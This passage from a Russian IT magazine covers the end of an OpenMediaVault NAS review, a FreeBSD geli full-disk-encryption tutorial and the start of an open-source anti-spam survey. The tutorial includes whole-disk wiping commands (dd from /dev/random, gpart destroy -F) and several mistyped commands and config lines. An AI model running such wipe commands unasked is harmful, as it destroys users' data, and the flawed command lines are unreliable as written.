тить, реализовано достаточно удобно.
   «Запланированные задания» — фронтенд к crontab. Опять же, как и в пре-
дыдущем случае, реализовано идеально.
  «Менеджер обновлений» — вкладку «Обновления» мы ранее уже рассмо-
трели. Вкладка «Настройка» предназначена для выбора дополнительных репо-
зиториев (пререлизы и обновления, выпускаемые сообществом). По умолча-
нию ни один из них не включен.
   «Плагины» — различные плагины, о них расскажем чуть ниже.





Управление плагинами

Поддерево «Хранилище» — в его ветвях мы уже были, когда создавали RAID-мас-
сив и файловую систему, поэтому рассмотрим только ветвь S.M.A.R.T. Здесь
у нас три вкладки. «Настройки» — здесь указывается интервал между проверка-
ми, режим питания, при котором диски будут проверяться, и контроль темпера-
туры (уведомление по достижении пороговой величины). На вкладке «Устрой-
ства» указываются отслеживаемые жесткие диски. И здесь очень не хватает
работающих переключателей в столбце «Мониторинг» таблицы. Вместо это-
го там индикатор, который очень похож на переключатель, но им не является,
что может запутать пользователя. Переключение же происходит путем нажа-
тия кнопки «Редактировать» и установки/снятия чекбокса в появившемся окне.
Вкладка «Запланированные тесты» в пояснениях не нуждается.





(Не)отслеживаемые устройства S.M.A.R.T.

В поддереве «Управление правами доступа» можно создавать пользователей,
группы (соответствующие ветви) и общие ресурсы, причем последним можно
назначать не только стандартные права доступа, но и ACL. Для новичка, воз-
можно, будет непонятно, что означают права исполнения на каталог, поэтому
стоило бы написать небольшую справку по этому вопросу.
   Поддерево «Сервисы» служит, понятное дело, для настройки различных
служб, одну из которых, Samba, мы и настроили ранее. Стоит рассмотреть
и другие имеющиеся службы.
  В ветви FTP поддерживается настройка портов, ограничение количества
клиентов, подключений и неудачных попыток входа. Также можно ограничить
пропускную способность. На вкладке SSL/TLS можно настроить шифрование
(сертификаты и прочее). В «Бан-листе» можно настраивать правила бана. На-
конец, «Общие ресурсы» предназначены для того же, для чего и аналогичная
вкладка в настройках Samba и, в общем-то, во всех остальных сервисах.
  В настройках NFS всего один параметр — количество создаваемых сервер-
ных потоков.
  В Rsync можно создавать запланированные задания. Вещь достаточно по-
лезная, только немного непонятно, зачем на NAS нужно локальное копирова-
ние файлов. При типе «Удаленный» перевод Push и Pull как «Нажать» и «Пул»
выглядит, мягко говоря, немного некорректным. Также не хватает опции «Со-
хранять числовые UID/GID»; впрочем, при необходимости эту опцию можно до-
бавить в «Дополнительные параметры» вручную. На вкладке «Сервер» имеются
две подвкладки — одна из них, «Настройки», не содержит ничего интересного
(порт сервера), а вторая, «Модули», действует аналогично «Общим ресурсам»,
за исключением отдельных, специфичных для Rsync, особенностей.
   Настройки SNMP не несут ничего особенного, разве что можно задать вер-
сию протокола и его безопасность (в случае третьей версии).
  В SSH также ничего нового — порт, типы аутентификации, запрет входа как
root, сжатие.
  Про настройки TFTP и вовсе не имеет смысла говорить — практически все
параметры, что есть в данной ветви, в изменении не нуждаются, за исключе-
нием пути, куда сохранять, и, возможно, разрешения создания новых файлов
(по умолчанию разрешено только заменять существующие).
   Поддерево «Диагностика» содержит всяческую информацию о системе.
На вкладке «Настройки» ветви «Системные журналы» можно настроить пере-
сылку логов на удаленный сервер Syslog.
   Ну а поддерево «Информация» содержит всяческую (бес)полезную инфор-
мацию о проекте.
   Также хочется отметить, что, если нажать на домик рядом с горизонталь-
ной панелью, отобразится то же самое, что видно в меню, только крупными
и красивыми значками. Кроме того, для перезагрузки прямо из веб-интерфей-
са можно использовать меню, вызываемое щелчком по значку как раз напротив
домика — и там же можно сменить язык интерфейса.





Меню завершения работы и режим крупных значков


РАСШИРЕННЫЕ ВОЗМОЖНОСТИ
Как уже упоминалось, в OpenMediaVault поддерживаются и плагины. Имеет
смысл их перечислить. Страница с ними поделена на секции, упорядоченные
по алфавиту.
  В секции Backup находится всего один плагин, OpenMediaVault-usbbackup,
позволяющий автоматически делать бэкапы на съемный USB-носитель.
  В секции Filesystems плагинов явно больше. Например, OpenMediaVault-
iscsitarget реализует поддержку iSCSI в веб-интерфейсе, а OpenMediaVault-
lvm2 добавляет функциональность LVM в него же. После установки данного
плагина в поддереве «Хранилище» появится ветвь «Управление логическими
томами», где можно создавать и редактировать физические тома, группы то-
мов и логические тома.





Добавленный плагин для LVM

Два  плагина  из  секции   Multimedia —  OpenMediaVault-forkeddaapd
и OpenMediaVault-shairport — предназначены для устройств Apple.
  В секции Network также есть два плагина. Один для работы с LDAP, вто-
рой же — возможность редактировать таблицу маршрутизации из веб-интер-
фейса. При его установке в ветви «Сеть» поддерева «Система» появится вклад-
ка «Статический маршрут».
  В секции Sharing внимания заслуживает только плагин OpenMediaVault-
owncloud, включающий поддержку ownCloud — WebDAV-хранилища. При этом,
разумеется, в веб-интерфейс добавляется необходимый пункт, «Сервисы ->
ownCloud», где, впрочем, конфигурируются все те же самые параметры, что
и везде.
  В секции Utilites имеется да плагина: OpenMediaVault-clamav, добавляющий
поддержку антивируса, и OpenMediaVault-nut, включающий поддержку Network
UPS Tools, который позволяет нескольким компьютерам использовать один
ИБП. При установке первого плагина появляется пункт «Сервисы -> Антивирус»,
где можно настроить типы сканируемых файлов, использовать ли улучшенный
метод обнаружения, основанный на сигнатурах алгоритмов. На вкладке «Зада-
ния», понятно, можно задавать, когда будет происходить сканирование.





Настройка антивируса

К интерфейсу управления плагинами имеется небольшое замечание: при нажа-
тии на какой-либо плагин он выделяется, но при повторном нажатии выделение
не убирается, и для его снятия приходится целенаправленно снимать чекбокс.
  Кроме веб-интерфейса, OpenMediaVault поддерживает еще и управление
из консоли. Основная команда для этого — omv-rpc. К сожалению, синтаксис
ее недокументирован. К примеру, для получения списка общих ресурсов до-
статочно набрать следующую команду:

# omv-rpc "ShareMgmt" "EnumerateSharedFolders"

Отмечу, что формат вывода JSON достаточно неудобен для человеческого вос-
приятия, так что лучше, конечно, использовать веб-интерфейс.





Пример вывода утилиты omv-ipc

Кроме команды omv-rpc, существуют еще несколько команд, специфичных для
OpenMediaVault:
•  omv-mkconf — создает конфиги для нужных сервисов. На самом деле дан-
  ный скрипт лишь верхушка айсберга. Он вызывает иные скрипты, которые,
   в свою очередь, и генерируют необходимые файлы;
•  omv-sysinfo — именно этот скрипт вызывается, когда формируется отчет
   о системе (вкладка «Отчет» в «Диагностика -> Системная информация»);
•  omv-pm-standby — переводит систему в спящий режим (hibernate). После
   вывода из этого режима в консоли слетает кодировка, причем ни команда
    reset, ни перелогинивание не помогают;
•  omv-firstaid — скрипт с curses-интерфейсом, позволяющий неопытному ад-
   министратору производить базовые восстановительные действия (такие
   как сброс пароля для входа в веб-интерфейс, настройка сетевого интер-
  фейса — к сожалению, поддерживается только один, восстановление базы
   данных RRD для корректного отображения графиков) при невозможности
   зайти в WebGUI.





Omv-firstaid — утилита для проведения восстановительных работ

Конфигурационный файл находится в /etc/OpenMediaVault/config.xml и досту-
пен только его владельцу. Разобраться в нем в случае необходимости доста-
точно просто. В остальном — дистрибутив ничем не отличается от Debian, в том
числе и по репозиториям.

ЗАКЛЮЧЕНИЕ
Дистрибутив предназначен для тех, кому нужно быстро и беспроблемно раз-
вернуть NAS на старом компьютере. Свое предназначение он выполняет, од-
нако есть у него, как всегда, и плюсы и минусы.
  Из минусов прежде всего стоит отметить довольно странную локализацию
интерфейса — порой создается впечатление, будто локализацию делили с по-
мощью машинного перевода. Во-вторых, в глаза бросается отсутствие мастера
быстрой настройки в веб-интерфейсе и отсутствие контекстной справки. Так-
же, на мой взгляд, процедура создания общего ресурса избыточно усложнена.
А в веб-интерфейсе есть достаточно большое количество ненужных, в общем-то,
настроек. Кроме того, в качестве языка написания веб-интерфейса использует-
ся PHP, а значит, есть достаточно большой риск необнаруженных дыр в нем.
   Что до плюсов… все же для неопытного пользователя (или для того, кто хо-
чет быстро развернуть NAS) конфигурировать с его помощью гораздо проще,
чем вручную. И есть удобный интерфейс настройки ACL.
   Резюмируя вышесказанное: этот дистрибутив предназначен в основном для
того случая, когда у тебя есть железо и не хочется его утилизировать. Для более
серьезных целей стоит использовать аппаратный NAS, такой как Synology.
Unixoid





КРИПТОФИЦИРУЕМ

                                                                                                         i55
                                                                                                           www.defec.ruFREEBSD
ИСПОЛЬЗОВАНИЕ СРЕДСТВ
КРИПТОГРАФИЧЕСКОЙ
ЗАЩИТЫ В ОС FREEBSD



В связи с последними событиями многие всерьез
задумываются о безопасности своих компьютер-
ных систем. Новостные ленты пестрят сообщениями
о том, что спецслужбы промышляют слежкой за спи-
нами обычных граждан. Громкие аресты, разоблаче-
ния и скандалы не сходят со страниц СМИ. И конечно,
каждому хочется себя обезопасить от глаз Большого
Брата, будь то реальная жизнь или виртуальная
реальность.

LOADING…
Обеспечение безопасности — дело трудное. Можно сравнить ее со стеной
из кирпичей: если правильно их сложить и скрепить, то получится прочная кон-
струкция. Но даже самая навороченная защита не спасет от злоумышленника,
если тот может спокойно получить физический доступ к объекту нападения. По-
этому обеспечивать безопасность мы начнем с ограничения такого доступа.
А точнее, рассмотрим случай, когда злоумышленник (спецслужбы, сантехник
дядя Вася…) уже получил его и намеревается прочитать твои секреты.
   Представим, что у тебя имеется сервер в дата-центре, персональный ком-
пьютер дома или ноутбук на работе. И не очень хочется, чтобы кто-то подошел
и покопался в них. При определенных условиях пароли не спасают от загрузки
с другого носителя, и тем более (что еще хуже) — от хищения HDD. В таких
ситуациях на помощь приходит криптография. Вот к ней-то мы и прибегнем,
чтобы защитить нашу информацию.

PRE-INSTALL
Не секрет, что от конфигурации компьютера зависит очень много, а работа
со средствами шифрования накладывает еще большие требования на железо.
Моя тестовая система выглядит так:

Intel Xeon SL8P2 3,8 ГГц
8192 RAM DDR-333 ECC
Intel RAID Controller SRCU42L Ultra320 SCSI, RAID 0/1/4/5/10,
    Cache 64 Мбайт
6 HDD SCSI MAT3073NC Ultra 320 SCSI/SCA2/LVD in RAID-10
OS: FreeBSD 10.1

Вариантов использования криптографии великое множество. Можно сделать
отдельный зашифрованный диск и хранить всю информацию там. Или же он
будет съемным, и можно использовать его тогда, когда потребуется. Это в ка-
кой-то степени защитит от злоумышленника. Почему в какой-то? Да потому, что
грамотный нападающий не побрезгует покопаться во временных или конфигу-
рационных файлах твоей системы. Возможно, он найдет то, что его интересует,
и ему не придется заниматься расшифровкой всего диска.
   Чтобы избежать столь неприятной ситуации, мы объединим описанные ва-
рианты в один и на выходе получим зашифрованный диск с ОС, которая будет
загружаться со съемного носителя. Ядро системы будет находиться на том же
самом носителе: чтобы загрузиться, нам понадобится физическое присут-
ствие. Вернее, для загрузки с зашифрованного корневого раздела необходи-
мо, чтобы ядро ОС было незашифрованным. В этом случае лучше всего его
разместить отдельно. Так мы убьем сразу двух зайцев одним выстрелом: без
носителя (ядра) система не загрузится, а злоумышленнику придется поду-
мать, как, не выключая сервер, перенести его в другое место для более де-
тального изучения:). Да и сам факт присутствия ОС будет скрыт от посторон-
них глаз, что не может не радовать.
   Конечно, это доставляет много неудобств, особенно если сервер критиче-
ский и работа должна идти 24/7/365. Но деваться некуда: чем безопаснее си-
стема, тем труднее ей пользоваться. Возможно, в будущем эти меры спасут
тебе жизнь. Согласись, весомее аргумент найти весьма затруднительно…





Сверка контрольной суммы образа FreeBSD          Размер съемного устройства
 10.1 с помощью HashTab                            в сравнении с монетой

   Итак, нам понадобится дистрибутив FreeBSD 10.1, записанный на любой но-
ситель. Настоятельно рекомендую скачивать последние с официального сай-
та производителя и сверять контрольные суммы. В качестве съемного носи-
теля, на котором мы будем хранить наше ядро, возьмем Kingston DataTraveler
microDuo USB 2.0. Выбор пал на него, так как он очень маленький — его можно
легко проглотить или быстро уничтожить в экстренных ситуациях.
   Не менее важна надежность носителя. Если у нас каким-то волшебным обра-
зом пропадет информация с него, мы можем со стопроцентной уверенностью
распрощаться с информацией на жестких дисках нашего сервера. У Kingston,
по многочисленным отзывам пользователей, с надежностью все нормально.
Стоит отметить, что стандарт USB 2.0 будет накладывать ограничения на ско-
рость загрузки ОС. Для достижения более высоких скоростей используй вер-
сию USB 3.0, если ее поддерживает твое оборудование.

INSTALL
Загружаемся с нужного нам устройства. Нас приветствует синий экран bsdinstall.
Жмем Install => Выбираем Keymap => Пишем Hostname => По желанию вы-
ставляем галочки в меню компонентов системы => В меню Partitioning выбира-
ем Shell.





Выбираем Shell

   Перед установкой ОС забьем наш диск (у меня аппаратный RAID-массив /
dev/da0) мусором. Процесс долгий и нудный, так что запасись терпением:

# /bin/dd if=/dev/random of=/dev/da0 bs=100m

Так же поступим с флешкой (/dev/da1):

# /bin/dd if=/dev/random of=/dev/da1 bs=10m

Уничтожим таблицы разделов на устройствах:

# /sbin/gpart destroy –F /dev/da0
# /sbin/gpart destroy –F /dev/da1

Создадим таблицу разделов GPT на флешке:

#/sbin/gpart create –s gpt /dev/da1
da1 created

Для загрузки c USB-устройства нам необходим маленький раздел с загрузчи-
ком на нем:

# /sbin/gpart add -t freebsd-boot -l bootcode -s 64k /dev/da1
da2p1 added

Далее создадим раздел, на котором будет храниться ядро ОС:

# /sbin/gpart add –t freebsd-usf –l bootfs –s 2g /dev/da1
da2p2 added

В первый сектор записываем загрузчик MBR (это делается для старого обору-
дования, которое не поддерживает GPT), которому передает управление BIOS
после включения компьютера. Он ищет раздел freebsd-boot по таблице GPT
и если его находит, то загружает его содержимое в память, тем самым пере-
давая эстафету управления ему. Там у нас прописался /boot/gptboot, который
проверяет корректность таблиц и заголовков, а также ищет раздел freebsd-ufs
и уже с него пытается загрузить ядро. Флаг -i указывает, что второй загрузчик
надо записать в первый раздел:

# /sbin/gpart bootcode -b /boot/pmbr -p /boot/gptboot -i 1 /dev/da1
bootcode written to da1

Создаем файловую систему (далее ФС) UFS2, включаем Soft Updates и журна-
лирование:

# /sbin/newfs –U –O2 –j /dev/da1p2

Работать с полностью зашифрованным диском намного удобнее, чем отдель-
но с разделами. На данном этапе смонтируем вновь созданную ФС на разделе
и создадим ключ шифрования для всего диска:

# /sbin/mount /dev/da1p2 /mnt
# cd /mnt && /bin/mkdir keys && cd keys
# /bin/dd if=/dev/random of=da0.key bs=512 count=10

Шифруем диск. Флаг -b активирует запрос пароля при на-
чальной загрузке до монтирования корневой файловой
системы. Флаг -K определяет файл ключа, — e задает ал-
горитм шифрования, — l определяет длину ключа, — s из-
меняет размер дешифруемого сектора, что положительно
влияет на производительность при шифровании/дешиф-    WWW
ровании.
                                                                      За более детальной   К выбору алгоритма шифрования стоит подходить
                                                                     информацией по GPT
с осторожностью. Надежность — это чуть ли не самый глав-                                                                          обращайся
ный критерий, по которому следует выбирать. Если алго-       к man gpart(8)
ритм не сможет противостоять криптоанализу, то нет смыс-
ла его использовать. По возможности надо выбирать старые алгоритмы,
которые испытаны временем, открыты для криптоанализа и проверены милли-
онами людей по всему миру. Только так можно быть более-менее уверенным,
что в алгоритме нет никаких закладок и уязвимостей — иначе можно наткнуться
на security through obscurity.

FUI

Security through obscurity  (рус. «безопасность через неясность») — принцип,
используемый для обеспечения безопасности в различных сферах деятельно-
сти человека. Основная идея — скрыть внутреннее устройство системы или ре-
ализацию для обеспечения безопасности. Почему это плохо и чем это грозит,
подробнее смотри тут.





Результаты тестирования зашифрованных ФС с помощью IOzone


   Не стоит забывать, что от того, какой алгоритм используется, будет зави-
сеть скорость дисковой подсистемы. О влиянии шифрования на чтение/запись
можно почитать в независимых исследованиях.

# /sbin/geli init -b -K da0.key -e Camellia -l 256 -s 4096 /dev/da0
Enter new passphrase:
Reenter new passphrase:

Теперь, когда диск зашифрован, его можно размечать,
но сначала его надо присоединить. Обрати внимание,
что работать мы будем с da0.eli. Буквы в конце названия
устройства означают, что наш диск зашифрован с помо-
щью криптографической подсистемы geli:
                                                DANGER
# /sbin/geli attach –k da0.key /dev/da0                   Вывод системных ко-
Enter passphrase for da0:                                    манд в статье сокращен
                                                                       и может существенно# /sbin/gpart create –s gpt /dev/da0.eli
                                                                                отличаться от других
da0.eli created                                                                                тестовых систем.

Почему мы выбрали именно geli, а не другую криптосистему? Поскольку Geli —
нативное средство шифрования, повышается производительность и крипто-
стойкость системы в целом. Имеется масса преимуществ: прозрачность работы
для конечного пользователя, поддержка целого ряда алгоритмов шифрования,
возможность иметь несколько ключей, загрузка с зашифрованного корнево-
го раздела, высокая скорость работы за счет простого криптования сектор —
сектор, поддержка одноразовых ключей шифрования и многое другое.
   Создаем раздел для корневой файловой системы в 2 Гбайт. Указываем тип
freebsd-ufs:

# /sbin/gpart add –t freebsd-ufs –l rootfs –s 2g /dev/da0.eli
da0.elip1 added

По поводу SWAP на сегодняшний день ведется много споров. Нужен или не ну-
жен — решать тебе. Но я считаю, что в наше время выделить под него место
не так дорого, как это было лет двадцать назад. В лучшем случае его можно
разместить на другом физическом диске, что снизит нагрузку на дисковую под-
систему.
   Если ты все-таки надумаешь воспользоваться этим вариантом, то у geli есть
великолепная возможность зашифровать раздел подкачки временным клю-
чом. Об этом можно почитать в руководстве по FreeBSD на официальном сай-
те. Формула, по которой я рассчитываю размер подкачки, очень проста: SWAP
>= RAM.

# /sbin/gpart add –t freebsd-swap –l swap –s 9g /dev/da0.eli
da0.elip2 added

Под /var отдадим 90 Гбайт места:

# /sbin/gpart add –t freebsd-ufs –l varfs –s 90g da0.eli
da0.elip3 added

Под /tmp — 13 Гбайт, так как некоторые программы при компиляции занимают
много места и могут переполнить его. Это сделает невозможным дальнейшее
корректное функционирование ОС:

# /sbin/gpart add –t freebsd-ufs –l tmpfs –s 13g /dev/da0.eli
da0.elip4 added

Под /usr выделим 60 Гбайт, а под /home — оставшееся место:

# /sbin/gpart add –t freebsd-ufs –l usrtfs –s 60g /dev/da0.eli
da0.elip5 added
# /sbin/gpart add –t freebsd-ufs –l homefs  /dev/da0.eli
da0.elip6 added

Создаем ФС на наших разделах, кроме SWAP (da0.elip2):

# /sbin/newfs –O2 –U –j /dev/da0.elip1
# /sbin/newfs –O2 –U –j /dev/da0.elip3
# /sbin/newfs –O2 –U –j /dev/da0.elip4
# /sbin/newfs –O2 –U –j /dev/da0.elip5
# /sbin/newfs –O2 –U –j /dev/da0.elip6

Размонтируем /dev/da1p2 и смонтируем корневую ФС в /mnt. Потом создадим
точки монтирования для остальных разделов:

# cd && /sbin/umount /mnt
# /sbin/mount /dev/da0.elip1 /mnt
# cd /mnt && /bin/mkdir var && /bin/mkdir tmp && /bin/mkdir usr &&
  /bin/mkdir  home
# /sbin/mount /dev/da0.elip3 var
# /sbin/mount /dev/da0.elip4 tmp
# /sbin/mount /dev/da0.elip5 usr
# /sbin/mount /dev/da0.elip6 home

Теперь нам необходимо создать временный файл fstab для «правильной» уста-
новки FreeBSD:

# /usr/bin/vi /tmp/bsdinstall-tmp-fstab
/dev/da0.elip1 /mnt ufs rw 1 1
/dev/da0.elip3 /mnt/var ufs rw 1 1
/dev/da0.elip4 /mnt/tmp ufs rw 1 1
/dev/da0.elip5 /mnt/usr ufs rw 1 1
/dev/da0.elip6 /mnt/home ufs rw 1 1

Проверяем, что ничего не забыли, выходим из shell’а и ждем, когда завершится
установка:

# /sbin/gpart show
# /bin/df -h
# exit

После инсталляции системы устанавливаем пароль суперпользователя. По же-
ланию настраиваем сеть, часовой пояс, добавляем пользователей. В меню
Final Configuration выбираем Exit => No => LiveCD. Логинимся под root’ом, мон-
тируем устройство, на которое скопируем ядро ОС, и перемещаем туда папку
с ключами:

# /sbin/mount /dev/da1p2 /mnt/mnt/ && cd /mnt/mnt
# /bin/cp –R  ../boot. && /bin/mv keys boot

Теперь, для того чтобы ОС загрузилась, нам надо «рассказать» ей, что же мы
натворили. Для этого необходимо отредактировать файл /boot/loader.conf:

# /usr/bin/vi boot/loader.conf
geom_eli_load="YES"
vsf.root.mountfrom="ufs:/dev/da0.elip1"
geli_da0_keyfile0_load="YES"
geli_da0_keyfile0_type="da0: geli_keyfile0"
geli_da0_keyfile0_name="/boot/keys/da0.key0"
kern.geom.eli.threads="4"
kern.geom.eli.batch="1"

Первая строчка загружает модуль crypto.ko, без которого ОС не сможет по-
нять наш диск. Вторая говорит, где находится корневая ФС. Дальнейшие три
указывают, где лежит ключ шифрования, и связывают его с диском. Последние
относятся к тюнингу подсистемы шифрования и необязательны. Они отвечают
за количество процессов ядра, используемых для шифрования. Это дает при-
рост производительности в многопроцессорных системах за счет групповых
операций при шифровании.
   На последнем этапе надо привести в порядок файл /etc/fstab для уже уста-
новленной системы:

# vi ../mnt/etc/fstab
/dev/da0.elip1 / ufs rw 1 1
/dev/da0.elip2 none swap sw 0 0
/dev/da0.elip3 /var ufs rw 1 1
/dev/da0.elip4 /tmp ufs rw 1 1
/dev/da0.elip5 /usr ufs rw 1 1
/dev/da0.elip6 /home ufs rw 1 1


POST-INSTALL
Теперь перезагружаемся и выставляем в BIOS загрузку с нашего USB-устрой-
ства, где лежит ядро. При монтировании корневой ФС будет запрошена па-
рольная фраза.





После ввода парольной фразы монтируется файловая система root

   Если вдруг вылезли какие-то ошибки или ты что-то забыл — не паникуй.
Можно загрузиться с установочного диска или флешки, перейти в режим Live
CD и исправить ошибки.
   Если у тебя Linux или Windows, значит ли это, что ты не сможешь воспользо-
ваться средствами шифрования? Совсем нет. Для них имеются свои решения.
Например, в Linux существует система шифрования LUKS/dm-crypt, на основе
подсистемы шифрования ядра, которая позволяет иметь несколько паролей
на один раздел и получать доступ к зашифрованным дискам из Windows с по-
мощью FreeOTFE. Управление криптосистемой производится посредством
утилиты cryptsetup. Еще один вариант, loop-AES представляет собой модифи-
кацию стандартного драйвера loop.ko, который позволяет производить шиф-
рование на лету.
   Для Windows существует EFS — компонент ОС, позволяющий сохранять ин-
формацию на жестком диске в зашифрованном виде. BitLocker позволяет за-
шифровать полностью диск, а не отдельные файлы и папки, как это делает EFS.
Есть множество сторонних коммерческих и некоммерческих продуктов под эти
и другие ОС: PGP, GnuPG, VeraCrypt (форк TrueCrypt), DiskCryptor, Challenger
и так далее. Многие из этих продуктов доступны во FreeBSD и могут использо-
ваться совместно.

LOADING COMPLETED
В заключение хочется отметить: даже если USB-устройство будет украдено
или утеряно, без парольной фразы злоумышленник не сможет получить доступ
к данным. Без флешки и пароля жесткий диск для него будет простым куском
металла. И как написано в handbook, «Вне зависимости от того, как атакующий
завладел жестким диском или выключенным компьютером, криптографическая
подсистема geli FreeBSD может защитить данные файловой системы компью-
тера даже против очень заинтересованной атакующей стороны с достаточны-
ми ресурсами».
   Также не стоит забывать, что шифрование существенно замедляет диско-
вую подсистему, и, возможно, каждый читатель сам для себя выберет алгоритм
шифрования, длину ключа, количество попыток ввода парольной фразы, чтения
ключа из файла по частям и прочее. Для искушенных параноиков можно доба-
вить проверку целостности данных HMAC-SHA и зашифровать SWAP времен-
ным ключом уже на зашифрованном диске:).
   Не стоит забывать о различных атаках на крипто-
графические алгоритмы. Например, от одной из них —
атаки на повторение — geli защитить не может. Об этом
и о многом другом рассказано в man geli(8).
    То, что никакая криптография не сможет спасти
                                  WWWот человеческого фактора — доказанный факт. Одна
маленькая ошибка, и все твои усилия пойдут коту под                                                                              Русская версия
хвост. Будь бдителен и помни: идеальной защиты не су-         мануала geli(8)
ществует.
SYN/ACK





  «ПРОДАМ ГАРАЖ!»
   РАССМАТРИВАЕМ ПОПУЛЯРНЫЕ
      OPEN SOURCE РЕШЕНИЯ
         ПРОТИВ СПАМА





Электронная почта все еще остается
основным средством обмена информа-
цией — и по-прежнему заодно приносит
пользователям тонны спама и вирусов,
которые мешают работе и ставят под
удар безопасность системы. Пробле-
                                                                            Мартин «urban.
                                                                                           prankster» Пранкевичма не нова, и на сегодня разработа-
                                                                                                     martin@synack.ru
ны сотни решений разной реализации
и лицензирования. Open source проекты
давно зарекомендовали себя с лучшей
стороны и обеспечивают безопасность
email тысяч организаций.

APACHE SPAMASSASSIN
SpamAssassin — open source система для борьбы со спамом, легко расширяе-
мая за счет плагинов и интегрируемая практически с любым почтовым решени-
ем. Все настройки и антиспам-тесты хранятся в обычных файлах, а потому лег-
ко могут быть добавлены и изменены под любые требования. Известность SA
получил благодаря использованию технологии байесовской фильтрации. Ка-
ждое сообщение при прохождении тестов получает определенный балл и при
достижении порога помещается в спам. В отличие от DSPAM, в котором ис-
пользуется только байесовский анализатор, в SA доступен и ряд других попу-
лярных технологий, обычно подключаемых в виде плагинов: DNSBL, SPF, DKIM,
URIBL, SURBL, PSBL, Razor, RelayCountry, автоматическое ведение белого спи-
ска (AWL) и другие.
   Количество плагинов, реализующих те или иные возможности, просто заш-
каливает. Некоторые идут в стандартной поставке, другие реализованы в виде
отдельных проектов. Например, плагин RegistryBoundaries позволяет дина-
мически определять домены верхнего уровня и обновлять связанные с ними
списки, плагин PhishTag позволяет переписывать ссылки внутри сообщений,
а URILocalBL добавляет тесты для URL в тексте, PDFInfo — блокирует спам
в PDF. И это только малая часть. Возможна проверка сообщений на вирусы
(ClamAV). Расширений очень много. Разработчики приводят список решений,
но вряд ли он полный.
   Модуль Mail:: SpamAssassin в CPAN, написанный на языке Perl, может быть
использован в нескольких вариантах — как клиент-сервер (spamd/spamc), как
отдельное приложение или интегрироваться в другую программу. Поддержива-
ются средства автоматического обновления правил фильтрации (при помощи
sa-update). Это очень мощная система, но универсальность и ориентирован-
ность на всё приводят к недостаточной оптимизации, в частности везде ис-
пользуются регулярные выражения. Хотя алгоритмы постоянно совершенству-
ются: в версии 3.2.0, например, появилась утилита sa-compile, компилирующая
правила в представление, оптимальное для быстрой параллельной обработки.
С точки зрения использования ресурсов компьютера SA показывает неплохие
результаты, обходя коммерческих конкурентов. SA также поддерживает IPv6
(с 3.4.0 — полностью), Multithreading и UTF-8.
   Релиз хорошо обкатывается, а поэтому после анонса готов к промышлен-
ной эксплуатации. Для хранения статистических данных могут использоваться
СУБД: MySQL, PgSQL, Redis, BDB и другие. Установка в общем несложна, коли-
чество зависимостей невелико; хотя, оно меняется от версии к версии, и нужно
быть внимательным. Плюс: нужный пакет есть в репозиториях. В Сети можно
найти множество руководств по интеграции с любым решением, поэтому слож-
ностей никаких.
  В поставке также идет несколько утилит sa-* для различных целей админи-
стрирования. Все настройки производятся в конфигурационном файле /etc/
spamassassin/local.cf. После установки SpamAssassin практически всегда
требует тонкой подстройки параметров и обучения на нормальных и спам-пись-
мах. Задачу упрощает наличие интерфейсов к SpamAssassin. Такие модули есть
в Webmin, Usermin, где они входят в стандартную поставку, и в Maia Mailguard.
Небольшой список модулей можно найти на этой странице.





В Webmin доступен модуль для конфигурирования SpamAssassin

   Некоторые фронтенды для управления email-серверами и электронной по-
чтой через веб также содержат специфические настройки; а также есть онлай-
новые генераторы конфигурационного файла, позволяющие сформировать
нужные настройки, просто ответив на вопросы.





Генератор настроек SpamAssassin

RSPAMD
Rspamd изначально разрабатывался россиянином Всеволодом Стаховым как
замена неповоротливому SpamAssassin для фильтрации спама в почте Rambler.
Он подходит для систем различного масштаба от небольших почтовых сер-
веров до крупных почтовых систем, умеет интегрироваться в различные MTA
(в документации описаны Exim, Postfix, Sendmail и Haraka) или работать в режи-
ме SMTP-прокси.
   Система оценки сообщений такая же, как в SpamAssassin, в частности на ос-
новании разных факторов: регулярных выражений, блок-листов DNS, белых,
серых, черных списков, SPF, DKIM, статистики, хешей (fuzzy hashes) и проче-
го — только в работе используются другие алгоритмы. Многие операции оп-
тимизированы, наиболее частые и легкие правила используются первыми, что
позволяет снизить нагрузку и уменьшить вероятность тяжелой обработки. Для
небольших и средних организаций подходят настройки из коробки. Обеспечи-
вается легкое горизонтальное масштабирование, синхронизация статистики
между мастер-узлом и подчиненными, мониторинг работы, возможность вы-
держивать всплески загрузки. Событийно-управляемая модель обработки по-
зволяет без блокировок работать с несколькими сообщениями одновременно.
Изначально адаптирован для работы на многопроцессорных системах.
  В Rspamd поддерживается расширение при помощи плагинов, которые
могут быть написаны на С и Lua, есть простая возможность добавления но-
вых фильтров и алгоритмов обработки писем. В поставке уже есть несколько
готовых модулей, которые можно отключить или подключить по мере необхо-
димости. При загрузке стартует master-процесс, производящий считывание
конфигурации и базовые проверки и запускающий несколько процессов-об-
работчиков (workers), каждый из которых может иметь свое назначение (обра-
ботка сообщений, SMTP-прокси, хеш и так далее). Все это регулируется в кон-
фигурационном файле.
   Для удобной настройки правил, веса и списков, сканирования и просмотра
статистики разработчиками предлагается простой, понятный и, главное, встро-
енный веб-интерфейс на HTML5/JS. Для запуска его нужно просто активиро-
вать в настройках. Изначально rspamd разрабатывался с расчетом на управле-
ние через веб-интерфейс. Первое время базовые настройки сохранялись
в XML-файле, в последних релизах уже используется совместимый с JSON
UCL-формат, принятый в nginx, который так же удобно парсить. Именно поэто-
му базовые параметры (вес и пороги срабатывания, пути к журналам, включе-
ние фильтров и прочее) настраиваются через UCL-файлы. Файлов несколько,
так как отдельные установки представлены своими файлами (это удобно), все
они подключаются в rspamd.conf. Для правил и более тонкой настройки работы
rspamd оставлена возможность конфигурирования из Lua (перекрывая XML-кон-
фиги) в rspamd.lua.





В rspamd доступен веб-интерфейс

  Rspamd позволяет указать некоторые данные как динамические (dynamic
maps), которые проверяются во время выполнения с обновлением данных
в случае их изменения. Поддерживаются файловые и HTTP-карты. Для обуче-
ния, проверки писем и мониторинга rspamd можно использовать консольный
клиент rspamc.
   Распространяется по BSD-лицензии. Ориентирован на применение толь-
ко в *nix-системах. Пакет есть в портах FreeBSD и репозитории CentOS,
universe-репозитории некоторых версий Ubuntu и Debian (правда, далеко не по-
следние версии). Остальным придется собирать из исходников.
  В настоящее время rspamd еще не достиг релиза, хотя текущий номер (0.9.4)
отражает скорее требование разработчиков, чем информацию о законченно-
сти продукта.

RAZOR/PYZOR
Обнаружение и распознавание спама в потоке — задача, забирающая доста-
точное количество ресурсов, а варианты спам-писем при этом практически не-
иссякаемы. Как и в случае с вирусами, один из методов решения — использо-
вать распределенную сеть датчиков, обнаруживающих спам на максимальном
количестве систем. Далее генерируется сигнатура, упрощающая распознава-
